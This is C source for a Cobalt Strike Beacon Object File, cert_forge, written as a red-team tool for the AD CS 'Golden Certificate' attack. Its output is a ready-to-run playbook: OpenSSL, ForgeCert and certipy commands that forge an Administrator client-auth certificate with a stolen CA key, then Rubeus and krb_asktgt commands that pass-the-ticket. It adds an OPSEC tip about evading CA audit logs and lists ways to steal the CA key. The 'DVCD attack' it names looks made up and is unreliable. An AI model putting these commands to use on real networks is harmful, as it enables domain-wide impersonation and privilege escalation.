/*
 * cert_forge - Forge Certificates with CA Private Key
 *
 * This implements the "Golden Certificate" attack (ESC7 post-exploitation).
 * Requires the CA private key (obtained from CA server backup, DVCD attack, etc.)
 *
 * Can forge certificates for any user including Domain Admins.
 *
 * Usage: cert_forge /cakey:CA_KEY_FILE /cacert:CA_CERT /subject:USER [/sid:SID] [/altname:UPN]
 */

#include "include/adcs_struct.h"
#include "include/adcs_utils.h"
#include "beacon.h"


typedef struct {
    char* buffer;
    int length;
    int position;
} ARG_PARSER;

static void arg_init(ARG_PARSER* parser, char* buffer, int length) {
    parser->buffer = buffer;
    parser->length = length;
    parser->position = 0;
}

static char* arg_get(ARG_PARSER* parser, const char* name) {
    char* buf = parser->buffer;
    int len = parser->length;
    char search[64];
    sprintf(search, "/%s:", name);
    int searchLen = strlen(search);

    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char* start = buf + i + searchLen;
            char* end = start;
            while (*end && *end != ' ' && *end != '\t' && *end != '\n') end++;
            int valueLen = end - start;
            char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, valueLen + 1);
            if (value) {
                memcpy(value, start, valueLen);
                value[valueLen] = '\0';
            }
            return value;
        }
    }

    sprintf(search, "/%s", name);
    searchLen = strlen(search);
    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char next = buf[i + searchLen];
            if (next == '\0' || next == ' ' || next == '\t' || next == '\n') {
                char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 2);
                if (value) value[0] = '1';
                return value;
            }
        }
    }

    return NULL;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* caKey = NULL;
    char* caCert = NULL;
    char* subject = NULL;
    char* sid = NULL;
    char* altName = NULL;
    char* template = NULL;
    char* outfile = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Forge Certificate (Golden Cert)\n\n");


    caKey = arg_get(&parser, "cakey");
    caCert = arg_get(&parser, "cacert");
    subject = arg_get(&parser, "subject");
    sid = arg_get(&parser, "sid");
    altName = arg_get(&parser, "altname");
    template = arg_get(&parser, "template");
    outfile = arg_get(&parser, "outfile");

    if (!caKey || !caCert || !subject) {
        BeaconFormatPrintf(&output, "[-] Error: /cakey, /cacert, and /subject required\n\n");
        BeaconFormatPrintf(&output, "Usage: cert_forge /cakey:CA.key /cacert:CA.cer /subject:USER [options]\n\n");
        BeaconFormatPrintf(&output, "Required:\n");
        BeaconFormatPrintf(&output, "  /cakey:FILE     - CA private key file (PEM or PFX)\n");
        BeaconFormatPrintf(&output, "  /cacert:FILE    - CA certificate file\n");
        BeaconFormatPrintf(&output, "  /subject:USER   - Target user (e.g., Administrator)\n\n");
        BeaconFormatPrintf(&output, "Optional:\n");
        BeaconFormatPrintf(&output, "  /sid:SID        - User SID for certificate\n");
        BeaconFormatPrintf(&output, "  /altname:UPN    - Subject Alternative Name (UPN)\n");
        BeaconFormatPrintf(&output, "  /template:NAME  - Template name to embed\n");
        BeaconFormatPrintf(&output, "  /outfile:FILE   - Output PFX file\n\n");
        BeaconFormatPrintf(&output, "Example:\n");
        BeaconFormatPrintf(&output, "  cert_forge /cakey:ca.key /cacert:ca.cer /subject:Administrator /altname:admin@corp.local\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] CA Private Key: %s\n", caKey);
    BeaconFormatPrintf(&output, "[*] CA Certificate: %s\n", caCert);
    BeaconFormatPrintf(&output, "[*] Target Subject: %s\n", subject);
    if (sid) BeaconFormatPrintf(&output, "[*] Target SID: %s\n", sid);
    if (altName) BeaconFormatPrintf(&output, "[*] Subject Alt Name: %s\n", altName);
    if (template) BeaconFormatPrintf(&output, "[*] Template: %s\n", template);

    BeaconFormatPrintf(&output, "\n[*] Certificate Forging Instructions:\n\n");

    BeaconFormatPrintf(&output, "=== Method 1: Using OpenSSL (Recommended) ===\n\n");

    BeaconFormatPrintf(&output, "Step 1: Generate user private key\n");
    BeaconFormatPrintf(&output, "  openssl genrsa -out user.key 2048\n\n");

    BeaconFormatPrintf(&output, "Step 2: Create certificate config (save as cert.conf)\n");
    BeaconFormatPrintf(&output, "  [req]\n");
    BeaconFormatPrintf(&output, "  distinguished_name = req_dn\n");
    BeaconFormatPrintf(&output, "  [req_dn]\n");
    BeaconFormatPrintf(&output, "  [v3_user]\n");
    BeaconFormatPrintf(&output, "  keyUsage = digitalSignature,keyEncipherment\n");
    BeaconFormatPrintf(&output, "  extendedKeyUsage = clientAuth,1.3.6.1.5.5.7.3.2\n");

    if (altName) {
        BeaconFormatPrintf(&output, "  subjectAltName = otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%s\n\n", altName);
    } else {
        BeaconFormatPrintf(&output, "  subjectAltName = otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%s@domain.local\n\n", subject);
    }

    BeaconFormatPrintf(&output, "Step 3: Generate CSR\n");
    BeaconFormatPrintf(&output, "  openssl req -new -key user.key -out user.csr -subj \"/CN=%s\"\n\n", subject);

    BeaconFormatPrintf(&output, "Step 4: Sign with CA key (forge the certificate)\n");
    BeaconFormatPrintf(&output, "  openssl x509 -req -in user.csr -CA %s -CAkey %s -out user.cer \\\n", caCert, caKey);
    BeaconFormatPrintf(&output, "    -CAcreateserial -days 365 -extfile cert.conf -extensions v3_user\n\n");

    BeaconFormatPrintf(&output, "Step 5: Create PFX\n");
    BeaconFormatPrintf(&output, "  openssl pkcs12 -export -out %s.pfx -inkey user.key -in user.cer -password pass:password\n\n",
        subject);

    BeaconFormatPrintf(&output, "=== Method 2: Using ForgeCert (SharpCollection) ===\n\n");

    BeaconFormatPrintf(&output, "  ForgeCert.exe --CaCertPath %s --CaKeyPath %s \\\n", caCert, caKey);
    BeaconFormatPrintf(&output, "    --Subject \"CN=%s\" --SubjectAltName \"%s\" \\\n",
        subject, altName ? altName : "user@domain.local");
    BeaconFormatPrintf(&output, "    --NewCertPath forged.pfx --NewCertPassword password\n\n");

    BeaconFormatPrintf(&output, "=== Method 3: Using certipy (Python) ===\n\n");

    BeaconFormatPrintf(&output, "  certipy forge -ca-pfx ca.pfx -upn %s -subject 'CN=%s'\n\n",
        altName ? altName : "admin@domain.local", subject);

    BeaconFormatPrintf(&output, "=== Using the Forged Certificate ===\n\n");

    BeaconFormatPrintf(&output, "Request TGT with forged certificate:\n");
    BeaconFormatPrintf(&output, "  krb_asktgt /user:%s /certificate:%s.pfx /password:password /ptt\n\n",
        subject, subject);

    BeaconFormatPrintf(&output, "Or with Rubeus:\n");
    BeaconFormatPrintf(&output, "  Rubeus.exe asktgt /user:%s /certificate:%s.pfx /password:password /ptt\n\n",
        subject, subject);

    BeaconFormatPrintf(&output, "[!] OPSEC Note: Forged certificates bypass normal CA audit logs\n");
    BeaconFormatPrintf(&output, "[!] However, authentication events will still be logged on DCs\n");

    BeaconFormatPrintf(&output, "\n[*] How to obtain CA private key:\n");
    BeaconFormatPrintf(&output, "  1. Backup CA on CA server: certutil -backupkey C:\\backup\n");
    BeaconFormatPrintf(&output, "  2. DVCD attack (Distributed Virtual CA Deployment)\n");
    BeaconFormatPrintf(&output, "  3. CA server compromise (DPAPI, memory extraction)\n");
    BeaconFormatPrintf(&output, "  4. Shadow credentials + ESC1 chain\n");

cleanup:
    if (caKey) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, caKey);
    if (caCert) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, caCert);
    if (subject) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, subject);
    if (sid) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, sid);
    if (altName) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, altName);
    if (template) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, template);
    if (outfile) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, outfile);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
